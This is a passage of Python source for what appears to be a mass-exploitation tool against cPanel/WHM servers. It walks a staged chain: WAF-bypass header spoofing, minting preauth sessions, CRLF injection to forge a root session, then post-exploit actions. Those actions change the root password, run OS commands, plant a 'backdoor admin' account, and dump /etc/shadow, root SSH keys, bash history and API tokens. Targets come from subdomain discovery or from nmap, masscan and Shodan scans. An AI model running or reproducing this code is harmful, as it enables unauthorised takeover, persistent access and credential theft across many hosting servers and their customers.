        try:
            researched.extend(waf_internet_research(waf, timeout=15))
        except Exception:
            pass
        finally:
            research_done.set()

    threading.Thread(target=_research, daemon=True, name="waf-research").start()

    # Try all local techniques
    for i, profile in enumerate(local_all, 1):
        name  = profile.get("name", f"profile-{i}")
        hdrs  = profile.get("headers", {})
        delay = profile.get("delay", 0.5)

        log("INFO",
            f"[bypass-agent] [{i}/{total_local}] {C.CYAN}{name}{C.RESET}")
        time.sleep(delay)

        token = stage2_inject(scheme, host, port, canonical,
                              session_base, timeout, waf_hdrs=hdrs)
        if token:
            log("OK",
                f"[bypass-agent] {C.GREEN}Bypass successful!{C.RESET} "
                f"technique: {name}")
            return token

    # Wait up to 25 s for internet research to finish
    research_done.wait(timeout=25)

    if researched:
        log("INFO",
            f"[bypass-agent] Trying {len(researched)} internet-researched technique(s)...")
        for i, hdrs in enumerate(researched, 1):
            log("INFO",
                f"[bypass-agent] [net-{i}/{len(researched)}] "
                f"headers: {list(hdrs.keys())}")
            time.sleep(0.5)
            token = stage2_inject(scheme, host, port, canonical,
                                  session_base, timeout, waf_hdrs=hdrs)
            if token:
                log("OK",
                    f"[bypass-agent] {C.GREEN}Bypass via internet-researched technique!{C.RESET}")
                return token

    log("WARN",
        f"[bypass-agent] All {total_local + len(researched)} technique(s) "
        f"exhausted — WAF held", f"{host}:{port}")
    return None

# ══════════════════════════════════════════════════════════════
#  SUBDOMAIN DISCOVERY
# ══════════════════════════════════════════════════════════════
_WHM_SIGNATURES = ("whm", "cpanel", "webhost manager", "cpsess",
                   "login_only", "cpsrvd", "webmail")

def _is_whm_response(resp: R) -> bool:
    """Return True if the response looks like a cPanel/WHM login page."""
    if resp.status == 0:
        return False
    body = (resp.body or "").lower()
    return any(sig in body for sig in _WHM_SIGNATURES)

def _parse_ct_entries(body: str, domain: str) -> Set[str]:
    """Parse JSON entries from any CT log API that returns name_value/common_name."""
    results: Set[str] = set()
    try:
        entries = json.loads(body)
        for entry in entries:
            for raw in entry.get("name_value", "").split("\n"):
                raw = raw.strip().lower().lstrip("*.")
                if raw == domain or raw.endswith(f".{domain}"):
                    results.add(raw)
            cn = entry.get("common_name", "").strip().lower().lstrip("*.")
            if cn == domain or cn.endswith(f".{domain}"):
                results.add(cn)
    except Exception:
        pass
    return results

def crtsh_subdomains(domain: str, timeout: int = 20) -> Set[str]:
    """
    Query CT logs for subdomains — crt.sh primary, certspotter.com fallback.
    Passive — generates no noise on the target.
    """
    results: Set[str] = set()

    # Primary: crt.sh
    log("DISC", f"Querying crt.sh for *.{domain} ...")
    try:
        resp = _do(f"https://crt.sh/?q=%.{domain}&output=json", timeout=timeout)
        if resp.status == 200 and resp.body:
            results = _parse_ct_entries(resp.body, domain)
            log("OK", f"crt.sh: {len(results)} hostname(s)")
            return results
        log("WARN", f"crt.sh HTTP {resp.status} — tentando certspotter...")
    except Exception as e:
        log("WARN", f"crt.sh falhou ({e}) — tentando certspotter...")

    # Fallback: certspotter.com
    log("DISC", f"Querying certspotter.com para *.{domain} ...")
    try:
        resp2 = _do(
            f"https://api.certspotter.com/v1/issuances"
            f"?domain={domain}&include_subdomains=true&expand=dns_names",
            timeout=timeout)
        if resp2.status == 200 and resp2.body:
            try:
                entries = json.loads(resp2.body)
                for entry in entries:
                    for name in entry.get("dns_names", []):
                        name = name.strip().lower().lstrip("*.")
                        if name == domain or name.endswith(f".{domain}"):
                            results.add(name)
                log("OK", f"certspotter: {len(results)} hostname(s)")
            except Exception:
                log("WARN", "certspotter: resposta inválida")
        else:
            log("WARN", f"certspotter HTTP {resp2.status}")
    except Exception as e:
        log("WARN", f"certspotter falhou: {e}")

    return results

def dns_brute(domain: str, wordlist: List[str], threads: int = 100) -> Set[str]:
    """Resolve subdomain prefixes via socket. Returns only hosts that resolve."""
    results: Set[str] = set()
    lock = threading.Lock()

    def _resolve(prefix: str):
        fqdn = f"{prefix}.{domain}"
        try:
            socket.getaddrinfo(fqdn, None)
            with lock:
                results.add(fqdn)
        except (socket.gaierror, socket.herror):
            pass

    log("DISC", f"DNS brute-force: {len(wordlist)} prefixes, {threads} workers ...")
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(_resolve, w) for w in wordlist]
        for _ in as_completed(futs):
            pass
    log("OK", f"DNS brute: {len(results)} live hostname(s)")
    return results

# WHM/cPanel ports to probe
WHM_PORTS = [2087, 2083, 2086, 2082]

def probe_whm(host: str, timeout: int = 8) -> Optional[str]:
    """
    Probe all WHM_PORTS in parallel; return the first URL with a cPanel/WHM
    login page, or None. Parallel probing avoids stalling on hanging ports.
    """
    result: list = []
    result_lock  = threading.Lock()

    def _try(port: int):
        scheme = "https" if port in (2087, 2083) else "http"
        url    = f"{scheme}://{host}:{port}/login"
        log("DISC", f"  probe {host}:{port} ...")
        resp   = _do(url, timeout=timeout, follow=False)
        if _is_whm_response(resp):
            with result_lock:
                if not result:
                    result.append(f"{scheme}://{host}:{port}")

    with ThreadPoolExecutor(max_workers=len(WHM_PORTS)) as ex:
        futs = [ex.submit(_try, p) for p in WHM_PORTS]
        for _ in as_completed(futs):
            pass

    return result[0] if result else None

def discover_subdomains(domain: str, threads: int, timeout: int,
                        timeout_probe: int = 5) -> List[str]:
    """
    Full subdomain discovery pipeline:
      1. crt.sh CT logs  (passive)
      2. DNS brute-force (active DNS only, no HTTP)
      3. WHM port probe  (ports 2087, 2083, 2086, 2082)

    Returns deduplicated list of live WHM URLs (scheme://host:port).
    """
    log("DISC", f"{'─'*50}")
    log("DISC", f"Subdomain discovery for: {C.CYAN}{domain}{C.RESET}")
    log("DISC", f"{'─'*50}")

    ct_hosts    = crtsh_subdomains(domain, timeout=max(timeout, 20))
    brute_hosts = dns_brute(domain, WHM_WORDLIST, threads=min(threads * 3, 150))

    all_hosts: Set[str] = ct_hosts | brute_hosts | {domain}
    log("DISC", f"Total unique hosts to probe: {len(all_hosts)}")

    log("DISC", f"Probing WHM ports on {len(all_hosts)} host(s) ...")
    live: List[str] = []
    live_lock = threading.Lock()

    def _probe(host: str):
        url = probe_whm(host, timeout=timeout_probe)
        if url:
            with live_lock:
                live.append(url)
            log("OK", f"WHM confirmed → {C.GREEN}{url}{C.RESET}")
        else:
            log("SKIP", f"No WHM on any port: {host}")

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(_probe, h) for h in sorted(all_hosts)]
        for _ in as_completed(futs):
            pass

    log("DISC", f"{'─'*50}")
    log("DISC",
        f"Discovery complete: {C.GREEN}{len(live)}{C.RESET} WHM target(s) found")
    log("DISC", f"{'─'*50}")
    return live

# ══════════════════════════════════════════════════════════════
#  INPUT FORMAT PARSERS (nmap XML / masscan JSON / Shodan NDJSON / plain text)
# ══════════════════════════════════════════════════════════════
def _port_scheme(port: int) -> str:
    return "https" if port in (2087, 2083, 443) else "http"

def parse_nmap_xml(path: str) -> List[str]:
    targets = []
    try:
        tree = ET.parse(path)
        for host in tree.findall(".//host"):
            addr = host.find("address[@addrtype='ipv4']")
            if addr is None:
                addr = host.find("address[@addrtype='ipv6']")
            if addr is None:
                continue
            ip = addr.get("addr", "")
            for port_el in host.findall(".//port"):
                port_id = int(port_el.get("portid", 0))
                state   = port_el.find("state")
                if state is not None and state.get("state") == "open" and port_id:
                    targets.append(f"{_port_scheme(port_id)}://{ip}:{port_id}")
    except Exception as e:
        log("WARN", f"nmap XML parse error: {e}")
    return targets

def parse_masscan_json(content: str) -> List[str]:
    targets = []
    c = content.strip()
    if not c.endswith("]"):
        c = c.rstrip(",\n") + "]"
    try:
        data = json.loads(c)
        for entry in data:
            ip   = entry.get("ip", "")
            port = (entry.get("ports") or [{}])[0].get("port", 0)
            if ip and port:
                targets.append(f"{_port_scheme(port)}://{ip}:{port}")
    except json.JSONDecodeError:
        for line in content.splitlines():
            line = line.strip().strip(",")
            if line in ("[", "]", ""):
                continue
            try:
                entry = json.loads(line)
                ip   = entry.get("ip", "")
                port = (entry.get("ports") or [{}])[0].get("port", 0)
                if ip and port:
                    targets.append(f"{_port_scheme(port)}://{ip}:{port}")
            except Exception:
                pass
    except Exception as e:
        log("WARN", f"masscan JSON parse error: {e}")
    return targets

def parse_shodan_json(content: str) -> List[str]:
    targets = []
    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            entry = json.loads(line)
            ip    = entry.get("ip_str", "")
            port  = entry.get("port", 2087)
            if ip:
                targets.append(f"{_port_scheme(port)}://{ip}:{port}")
        except Exception:
            pass
    return targets

def load_list_file(path: str) -> List[str]:
    """Auto-detect input format and return list of target URL strings."""
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            raw = f.read()
    except FileNotFoundError:
        return []

    stripped = raw.lstrip()
    if path.lower().endswith(".xml") or "<nmaprun" in stripped[:300]:
        log("INFO", "Detected nmap XML format")
        return parse_nmap_xml(path)
    if stripped.startswith("["):
        log("INFO", "Detected masscan JSON format")
        return parse_masscan_json(stripped)
    if stripped.startswith("{"):
        log("INFO", "Detected Shodan NDJSON format")
        return parse_shodan_json(stripped)
    # Plain text — one target per line
    return [ln.strip() for ln in raw.splitlines()
            if ln.strip() and not ln.strip().startswith("#")]

# ══════════════════════════════════════════════════════════════
#  EXCLUDE LIST
# ══════════════════════════════════════════════════════════════
def load_exclude(path: str) -> Set[str]:
    """Load host:port pairs to exclude from scanning."""
    excluded: Set[str] = set()
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if "://" not in line:
                    line = "https://" + line
                _, h, port = parse_target(line)
                excluded.add(f"{h}:{port}")
    except FileNotFoundError:
        log("WARN", f"Exclude file not found: {path}")
    return excluded

def is_excluded(target: str, excluded: Set[str]) -> bool:
    if not excluded:
        return False
    if "://" not in target:
        target = "https://" + target
    _, h, port = parse_target(target)
    return f"{h}:{port}" in excluded

# ══════════════════════════════════════════════════════════════
#  TARGET PARSING
# ══════════════════════════════════════════════════════════════
def parse_target(url: str) -> tuple:
    if "://" not in url:
        url = "https://" + url
    u = urlsplit(url.rstrip("/"))
    return u.scheme or "https", u.hostname or url, u.port or 2087

def _has_explicit_port(raw: str) -> bool:
    """Return True if the user explicitly included a port number in the target."""
    s = raw
    if "://" in s:
        s = s.split("://", 1)[1]
    s = s.split("/")[0]          # strip path
    if s.startswith("["):        # IPv6: [::1]:2087
        return "]:" in s
    return ":" in s

def build_url(scheme, host, port, path):
    if (scheme == "https" and port == 443) or (scheme == "http" and port == 80):
        return f"{scheme}://{host}{path}"
    return f"{scheme}://{host}:{port}{path}"

def is_version_patched(version: str) -> Optional[bool]:
    m = re.match(r"11\.(\d+)\.(\d+)\.(\d+)", version)
    if not m:
        return None
    branch, patch, build = m.group(1), int(m.group(2)), int(m.group(3))
    if branch in PATCHED:
        patched_patch, patched_build = PATCHED[branch]
        return (patch, build) >= (patched_patch, patched_build)
    return None

# ══════════════════════════════════════════════════════════════
#  PASSIVE VERSION CHECK (--check mode)
# ══════════════════════════════════════════════════════════════
def check_target(target: str) -> dict:
    """Passive version check — no exploit, no session minting."""
    if "://" not in target:
        target = "https://" + target
    # Auto-enumerate port if not specified
    if not _has_explicit_port(target):
        _, _host, _ = parse_target(target)
        found = probe_whm(_host, timeout=_TIMEOUT_PROBE)
        if found:
            target = found
    scheme, host, port = parse_target(target)
    result = {"target": target, "check_only": True}

    # Try unauthenticated /json-api/version
    url  = build_url(scheme, host, port, "/json-api/version?api.version=1")
    resp = _do(url, timeout=_TIMEOUT_PROBE)
    if resp.status == 200 and '"version"' in (resp.body or ""):
        m = re.search(r'"version"\s*:\s*"([^"]+)"', resp.body)
        version = m.group(1) if m else "unknown"
        patched = is_version_patched(version)
        result["version"] = version
        result["patched"] = patched
        if patched is False:
            log("HIGH", f"VULNERABLE v{version} — unpatched", target)
        elif patched is True:
            log("INFO",  f"Patched    v{version}", target)
        else:
            log("WARN",  f"Unknown branch v{version}", target)
        return result

    # Fallback: scrape version from login page
    url2  = build_url(scheme, host, port, "/login")
    resp2 = _do(url2, timeout=_TIMEOUT_PROBE, follow=False)
    body2 = resp2.body or ""
    m2    = re.search(r'(?:cPanel|WHM)[^"\']*?(\d+\.\d+\.\d+\.\d+)',
                      body2, re.IGNORECASE)
    if m2:
        version = m2.group(1)
        if not version.startswith("11."):
            version = "11." + version
        patched = is_version_patched(version)
        result["version"] = version
        result["patched"] = patched
        log("INFO", f"Version from login page: v{version}", target)
    else:
        result["error"] = f"HTTP {resp.status} — version not exposed"
        log("WARN", f"Cannot determine version (HTTP {resp.status})", target)

    return result

# ══════════════════════════════════════════════════════════════
#  STAGE 0 — Canonical hostname discovery
# ══════════════════════════════════════════════════════════════
def stage0_canonical(scheme, host, port, timeout,
                     waf_hdrs: Optional[dict] = None) -> str:
    """cpsrvd 307s to the correct hostname when our Host is wrong."""
    url  = build_url(scheme, host, port, "/openid_connect/cpanelid")
    resp = _do(url, timeout=timeout, follow=False,
               extra_headers=waf_hdrs or {})
    loc  = resp.location()
    m    = re.match(r"^https?://([^:/]+)", loc)
    if m:
        canonical = m.group(1)
        log("INFO", f"Canonical hostname discovered: {canonical}")
        return canonical
    return host

# ══════════════════════════════════════════════════════════════
#  STAGE 1 — Mint preauth session
# ══════════════════════════════════════════════════════════════
def stage1_preauth(scheme, host, port, canonical, timeout,
                   waf_hdrs: Optional[dict] = None) -> Optional[str]:
    """POST wrong creds → 401 + whostmgrsession cookie."""
    url  = build_url(scheme, host, port, "/login/?login_only=1")
    resp = _do(url, method="POST",
               data={"user": "root", "pass": "wrong"},
               extra_headers=waf_hdrs or {},
               timeout=timeout, canonical_host=canonical)

    if resp.status not in (200, 401):
        log("ERR", f"Stage1: unexpected status {resp.status}")
        return None

    raw_ck = resp.raw_cookie("whostmgrsession")
    if not raw_ck:
        raw_ck = resp.h("set-cookie")
        m = re.search(r'whostmgrsession=([^;,\s]+)', raw_ck, re.IGNORECASE)
        raw_ck = m.group(1) if m else ""

    if not raw_ck:
        log("ERR", "Stage1: no whostmgrsession cookie received")
        return None

    decoded      = unquote(raw_ck)
    session_base = decoded.split(",", 1)[0] if "," in decoded else decoded
    log("OK", f"Stage1: preauth session = {session_base[:35]}...")
    return session_base

# ══════════════════════════════════════════════════════════════
#  STAGE 2 — CRLF injection
# ══════════════════════════════════════════════════════════════
def stage2_inject(scheme, host, port, canonical, session_base, timeout,
                  waf_hdrs: Optional[dict] = None) -> Optional[str]:
    """GET / with CRLF-poisoned Authorization: Basic → session file poisoned."""
    cookie_enc = quote(session_base)
    url  = build_url(scheme, host, port, "/")
    # Bypass headers injected first; Authorization + Cookie always override them
    hdrs = {**(waf_hdrs or {}),
            "Authorization": f"Basic {PAYLOAD_B64}",
            "Cookie":        f"whostmgrsession={cookie_enc}"}
    resp = _do(url, method="GET", extra_headers=hdrs,
               timeout=timeout, canonical_host=canonical)

    loc = resp.location()
    m   = re.search(r"/cpsess(\d{10})", loc)
    if not m:
        log("ERR", f"Stage2: no /cpsess token in redirect (HTTP {resp.status})")
        if loc:
            log("WARN", f"Stage2: Location={loc[:80]}")
        return None

    token = f"/cpsess{m.group(1)}"
    log("OK", f"Stage2: HTTP {resp.status} → token={token}")
    return token

# ══════════════════════════════════════════════════════════════
#  STAGE 3 — Propagate (do_token_denied gadget)
# ══════════════════════════════════════════════════════════════
def stage3_propagate(scheme, host, port, canonical, session_base, timeout,
                     waf_hdrs: Optional[dict] = None) -> bool:
    """Flush raw session file into cache via do_token_denied internal gadget."""
    cookie_enc = quote(session_base)
    url  = build_url(scheme, host, port, "/scripts2/listaccts")
    hdrs = {**(waf_hdrs or {}), "Cookie": f"whostmgrsession={cookie_enc}"}
    resp = _do(url, method="GET", extra_headers=hdrs,
               timeout=timeout, canonical_host=canonical)

    body = resp.body or ""
    if resp.status == 401 and any(x in body for x in
                                   ["Token denied", "WHM Login", "login"]):
        log("OK", f"Stage3: HTTP {resp.status} — do_token_denied gadget fired")
        return True
    if resp.status in (200, 301, 302, 307):
        log("OK", f"Stage3: HTTP {resp.status} — propagation likely fired")
        return True
    log("WARN", f"Stage3: unexpected HTTP {resp.status} — continuing anyway")
    return True

# ══════════════════════════════════════════════════════════════
#  STAGE 4 — Verify WHM root access
# ══════════════════════════════════════════════════════════════
def stage4_verify(scheme, host, port, canonical, session_base, token, timeout,
                  waf_hdrs: Optional[dict] = None) -> dict:
    """GET /{{token}}/json-api/version → 200 + version = confirmed."""
    cookie_enc = quote(session_base)
    url  = build_url(scheme, host, port, f"{token}/json-api/version")
    hdrs = {**(waf_hdrs or {}), "Cookie": f"whostmgrsession={cookie_enc}"}
    resp = _do(url, method="GET", extra_headers=hdrs,
               timeout=timeout, canonical_host=canonical)

    body = (resp.body or "").strip()
    log("INFO", f"Stage4: HTTP {resp.status}  {body[:100]}")

    if resp.status == 200 and '"version"' in body:
        version = ""
        m = re.search(r'"version"\s*:\s*"([^"]+)"', body)
        if m:
            version = m.group(1)
        return {"confirmed": True, "version": version, "body": body[:600]}

    if resp.status in (500, 503) and "License" in body:
        return {"confirmed": True, "version": "unknown (license-gated)",
                "body": body[:300]}

    return {"confirmed": False}

# ══════════════════════════════════════════════════════════════
#  WHM API CALLER
# ══════════════════════════════════════════════════════════════
def whm_api(ctx: ScanCtx, function: str, params: dict) -> tuple:
    """Call authenticated WHM JSON API."""
    cookie_enc = quote(ctx.session_base)
    qs = "api.version=1"
    for k, v in params.items():
        if v is not None:
            qs += f"&{quote(str(k))}={quote(str(v))}"
    path = f"{ctx.token}/json-api/{function}?{qs}"
    url  = build_url(ctx.scheme, ctx.host, ctx.port, path)
    hdrs = {**ctx.bypass_hdrs, "Cookie": f"whostmgrsession={cookie_enc}"}
    resp = _do(url, method="GET", extra_headers=hdrs,
               timeout=ctx.timeout, canonical_host=ctx.canonical)
    log("API", f"{function} → HTTP {resp.status}")
    try:
        return resp.status, json.loads(resp.body)
    except Exception:
        return resp.status, resp.body

# ══════════════════════════════════════════════════════════════
#  POST-EXPLOIT ACTIONS
# ══════════════════════════════════════════════════════════════
def action_list_accounts(ctx: ScanCtx):
    log("API", "Listing all cPanel accounts...")
    s, data = whm_api(ctx, "listaccts", {"search": "", "searchtype": "user"})
    if isinstance(data, dict):
        accts = data.get("data", {}).get("acct", [])
        if accts:
            log("OK", f"Found {len(accts)} cPanel accounts:")
            for a in accts:
                safe_print(f"  {C.GREEN}  user={a.get('user','?'):20s} "
                           f"domain={a.get('domain','?'):30s} "
                           f"email={a.get('email','?')}{C.RESET}")
        else:
            safe_print(str(data)[:1000])
    else:
        safe_print(str(data)[:1000])

def action_change_passwd(ctx: ScanCtx, new_password: str):
    log("API", f"Changing root password → {new_password}")
    s, data = whm_api(ctx, "passwd", {"user": "root", "password": new_password})
    safe_print(json.dumps(data, indent=2)[:800] if isinstance(data, dict)
               else str(data)[:800])

def action_exec_cmd(ctx: ScanCtx, cmd: str):
    """Execute OS command — falls through methods until one works."""
    cookie_enc = quote(ctx.session_base)
    log("API", f"Executing: {cmd}")

    # Method 1: WHM json-api/scripts/exec
    s, data = whm_api(ctx, "scripts/exec", {"command": cmd})
    if s == 200 and isinstance(data, dict):
        output = (data.get("data", {}).get("output") or
                  data.get("output") or str(data))
        if output and "Cannot Read License" not in str(output):
            safe_print(f"\n{C.GREEN}{output}{C.RESET}")
            return

    log("API", "scripts/exec gated — trying alternative exec methods...")

    # Method 2: cpanel jsonapi exec endpoints
    for ep in [
        f"{ctx.token}/json-api/cpanel?cpanel_jsonapi_module=Exec"
          f"&cpanel_jsonapi_func=exec&command={quote(cmd)}",
        f"{ctx.token}/execute/Exec/exec?command={quote(cmd)}",
    ]:
        url = build_url(ctx.scheme, ctx.host, ctx.port, ep)
        r2  = _do(url, extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
                  timeout=ctx.timeout, canonical_host=ctx.canonical)
        log("API", f"  {ep[:40]} → HTTP {r2.status}")
        if r2.status == 200 and r2.body and "Cannot Read License" not in r2.body:
            safe_print(f"\n{C.GREEN}{r2.body[:800]}{C.RESET}")
            return

    # Method 3: Direct file reads as last resort
    log("API", "Exec blocked by license — trying direct file reads...")
    for fpath in ["/etc/passwd", "/etc/hostname", "/proc/version", "/etc/os-release"]:
        for ep in [
            f"{ctx.token}/json-api/cpanel?cpanel_jsonapi_module=Fileman"
              f"&cpanel_jsonapi_func=viewfile&dir=/&file={quote(fpath)}",
            f"{ctx.token}/execute/Fileman/get_file_content?dir=%2F"
              f"&file={quote(fpath.lstrip('/'))}",
        ]:
            url = build_url(ctx.scheme, ctx.host, ctx.port, ep)
            r3  = _do(url, extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
                      timeout=ctx.timeout, canonical_host=ctx.canonical)
            if (r3.status == 200 and r3.body and len(r3.body) > 10
                    and "Cannot Read License" not in r3.body):
                safe_print(f"\n  {C.CYAN}[{fpath}]{C.RESET}")
                safe_print(f"  {C.GREEN}{r3.body[:400]}{C.RESET}")
                return

    log("API", "License blocks all exec — version confirmed via /json-api/version")

def action_read_file_direct(ctx: ScanCtx, path: str) -> str:
    """Read file via WHM filemanager API; returns content or empty string."""
    cookie_enc = quote(ctx.session_base)
    for ep in [
        f"{ctx.token}/json-api/cpanel?cpanel_jsonapi_module=Fileman"
          f"&cpanel_jsonapi_func=viewfile&dir=/&file={quote(path)}",
        f"{ctx.token}/execute/Fileman/get_file_content?dir=/&file={quote(path)}",
        f"{ctx.token}/../..{path}",
    ]:
        url = build_url(ctx.scheme, ctx.host, ctx.port, ep)
        r   = _do(url, extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
                  timeout=ctx.timeout, canonical_host=ctx.canonical)
        if r.status == 200 and r.body and len(r.body) > 5:
            return r.body
    return ""

def action_read_file(ctx: ScanCtx, path: str):
    log("API", f"Reading file: {path}")
    content = action_read_file_direct(ctx, path)
    if content:
        safe_print(f"{C.GREEN}{content[:2000]}{C.RESET}")
    else:
        log("WARN", f"Could not read {path} — license may block file access")

def action_server_info(ctx: ScanCtx):
    """Gather server info — all API calls run in parallel."""
    log("API", "Gathering server info (license-safe endpoints)...")
    endpoints = [
        ("gethostname",   {}, "hostname"),
        ("loadavg",       {}, "load"),
        ("getdiskinfo",   {}, "disk"),
        ("getmysqlhost",  {}, "mysql_host"),
        ("listresellers", {}, "resellers"),
        ("version",       {}, "version"),
    ]

    info: dict = {}
    info_lock  = threading.Lock()

    def _fetch(ep, params, label):
        s, data = whm_api(ctx, ep, params)
        with info_lock:
            if s == 200 and isinstance(data, dict):
                info[label] = data.get("data", data.get("result", data))
                log("API", f"  {ep} → {C.GREEN}OK{C.RESET}")
            else:
                log("API", f"  {ep} → HTTP {s}")

    with ThreadPoolExecutor(max_workers=len(endpoints)) as ex:
        for f in as_completed([ex.submit(_fetch, ep, p, lbl)
                                for ep, p, lbl in endpoints]):
            f.result()

    safe_print(f"\n{C.CYAN}[Server Info]{C.RESET}  "
               f"{ctx.scheme}://{ctx.host}:{ctx.port}")
    safe_print(json.dumps(info, indent=2, default=str)[:2000])

def action_version(ctx: ScanCtx):
    s, data = whm_api(ctx, "version", {})
    safe_print(json.dumps(data, indent=2)[:600] if isinstance(data, dict)
               else str(data)[:600])

def action_create_user(ctx: ScanCtx, username: str, domain: str, passwd: str):
    log("API", f"Creating account: {username} / {domain}")
    s, data = whm_api(ctx, "createacct",
                      {"username": username, "domain": domain,
                       "password": passwd, "plan": "default"})
    safe_print(json.dumps(data, indent=2)[:800] if isinstance(data, dict)
               else str(data)[:800])

def action_add_admin(ctx: ScanCtx, username: str, password: str):
    """Create a new WHM reseller/admin backdoor account."""
    log("API", f"Adding backdoor admin: {username}")

    s, data = whm_api(ctx, "createacct",
                      {"username": username, "domain": f"{username}.invalid",
                       "password": password, "plan": "default"})
    if s != 200 or not isinstance(data, dict):
        log("ERR", f"createacct failed → HTTP {s}: {str(data)[:200]}")
        return

    s2, _ = whm_api(ctx, "setupreseller", {"user": username, "makeowner": 1})
    log("API", f"  setupreseller → HTTP {s2}")

    s3, _ = whm_api(ctx, "saveacllist", {"acllist": "all", "user": username})
    log("API", f"  saveacllist → HTTP {s3}")

    safe_print(f"\n  {C.RED}{C.BOLD}Backdoor admin created:{C.RESET}")
    safe_print(f"  user  : {C.GREEN}{username}{C.RESET}")
    safe_print(f"  pass  : {C.GREEN}{password}{C.RESET}")
    safe_print(f"  login : {build_url(ctx.scheme, ctx.host, ctx.port, '/login')}\n")

def action_dump(ctx: ScanCtx):
    """Mass dump: accounts + critical sensitive files."""
    log("API", "Starting mass dump...")

    # Accounts
    s, data = whm_api(ctx, "listaccts", {"search": "", "searchtype": "user"})
    if isinstance(data, dict):
        accts = data.get("data", {}).get("acct", [])
        safe_print(f"\n{C.CYAN}{'═'*60}{C.RESET}")
        safe_print(f"{C.CYAN}[ACCOUNTS — {len(accts)} found]{C.RESET}")
        safe_print(f"{C.CYAN}{'═'*60}{C.RESET}")
        for a in accts:
            safe_print(f"  {C.GREEN}{a.get('user','?'):20s} "
                       f"{a.get('domain','?'):30s} "
                       f"{a.get('email','?')}{C.RESET}")

    # Sensitive files
    dump_files = [
        "/etc/shadow",
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_ecdsa",
        "/root/.ssh/authorized_keys",
        "/root/.bash_history",
        "/var/cpanel/authn/api_tokens/root.json",
        "/etc/passwd",
        "/etc/hostname",
    ]
    for fpath in dump_files:
        content = action_read_file_direct(ctx, fpath)
        if content:
            safe_print(f"\n{C.RED}{'─'*60}{C.RESET}")
            safe_print(f"{C.RED}[FILE: {fpath}]{C.RESET}")
            safe_print(f"{C.RED}{'─'*60}{C.RESET}")
            safe_print(f"{C.GREEN}{content[:3000]}{C.RESET}")
        else:
            log("SKIP", f"Cannot read {fpath} — may not exist or license blocks")

# ══════════════════════════════════════════════════════════════
#  ACTION DISPATCHER — shared by single-target and --post-all
# ══════════════════════════════════════════════════════════════
def run_action(ctx: ScanCtx, args):
    a = args.action.lower()
    log("API", f"Running post-exploit action: {a}", f"{ctx.host}:{ctx.port}")

    if a == "list":
        action_list_accounts(ctx)
    elif a == "passwd":
        if args.passwd:
            action_change_passwd(ctx, args.passwd)
        else:
            log("ERR", "--passwd required for action passwd")
    elif a in ("cmd", "exec"):
        action_exec_cmd(ctx, args.cmd or "id;whoami;uname -a")
    elif a == "info":
        action_server_info(ctx)
    elif a == "version":
        action_version(ctx)
    elif a == "adduser":
        nu = getattr(args, "new_user", None)
        nd = getattr(args, "new_domain", None)
        np = args.passwd or "TempPass2026!"
        if nu and nd:
            action_create_user(ctx, nu, nd, np)
        else:
            log("ERR", "--new-user and --new-domain required for adduser")
    elif a == "addadmin":
        nu = getattr(args, "new_user", None)
        np = args.passwd
        if nu and np:
            action_add_admin(ctx, nu, np)
        else:
            log("ERR", "--new-user and --passwd required for addadmin")
    elif a == "readfile":
        if args.read_file:
            action_read_file(ctx, args.read_file)
        else:
            log("ERR", "--read-file required for action readfile")
    elif a == "dump":
        action_dump(ctx)
    elif a == "shell":
        whm_shell(ctx)
    else:
        log("WARN", f"Unknown action '{a}'")

# ══════════════════════════════════════════════════════════════
#  FINDINGS + CTX MAP
# ══════════════════════════════════════════════════════════════
class Store:
    _SEV = {"CRIT": 0, "HIGH": 1, "MED": 2, "INFO": 3}

    def __init__(self):
        self._f    = []
        self._seen = set()
        self._lock = threading.Lock()

    def add(self, f):
        k = f.get("target", "")
        with self._lock:
            if k in self._seen: return
            self._seen.add(k)
            self._f.append(f)

    def all(self):
        return sorted(self._f,
                      key=lambda x: self._SEV.get(x.get("severity", "INFO"), 9))

STORE    = Store()
CTX_MAP: Dict[str, ScanCtx] = {}
CTX_MAP_LOCK = threading.Lock()

# ══════════════════════════════════════════════════════════════
#  PROGRESS TRACKER
# ══════════════════════════════════════════════════════════════
class Progress:
    def __init__(self, total: int):
        self._total = total
        self._done  = 0
        self._vulns = 0
        self._lock  = threading.Lock()

    def tick(self, vuln: bool = False):
        with self._lock:
            self._done += 1
            if vuln:
                self._vulns += 1
            pct = self._done * 100 // self._total
            bar = "█" * (pct // 5) + "░" * (20 - pct // 5)
            log("PROG",
                f"[{bar}] {self._done}/{self._total} ({pct}%)  "
                f"vulns={C.RED}{self._vulns}{C.RESET}")

# ══════════════════════════════════════════════════════════════
#  MAIN SCANNER
# ══════════════════════════════════════════════════════════════
def scan(target: str, args, progress: Optional[Progress] = None) -> dict:
    if "://" not in target:
        target = "https://" + target
    target = target.rstrip("/")

    # Auto-enumerate port when none was explicitly specified
    if not _has_explicit_port(target):
        _, _host, _ = parse_target(target)
        log("INFO", f"Porta não informada — enumerando {WHM_PORTS}...", _host)
        found = probe_whm(_host, timeout=_TIMEOUT_PROBE)
        if found:
            target = found
            log("OK", f"WHM encontrado em {C.GREEN}{found}{C.RESET}", _host)
        else:
            target = f"https://{_host}:2087"
            log("WARN", f"Nenhuma porta WHM respondeu — tentando 2087", _host)

    result = {"target": target, "vuln": False}

    log("SCAN", "Starting exploit chain...", target)
    scheme, host, port = parse_target(target)
    timeout = args.timeout

    # WAF/CDN detection (quick probe, non-blocking)
    waf = detect_waf(scheme, host, port, _TIMEOUT_PROBE)
    if waf:
        result["waf"] = waf
        waf_hdrs  = get_bypass_headers(waf)
        waf_dl    = get_bypass_delay(waf)
        log("WARN",
            f"WAF/CDN detected: {C.YELLOW}{waf}{C.RESET} — bypass profile active",
            target)
        log("INFO",
            f"  Bypass: {len(waf_hdrs)} spoofing header(s)  "
            f"inter-stage delay={waf_dl}s  "
            f"headers={list(waf_hdrs.keys())}")
    else:
        waf_hdrs = {}
        waf_dl   = 0.0

    # Session reuse — skip stages 0-3 if --session + --token provided
    provided_session = getattr(args, "session", None)
    provided_token   = getattr(args, "token_reuse", None)

    if provided_session and provided_token:
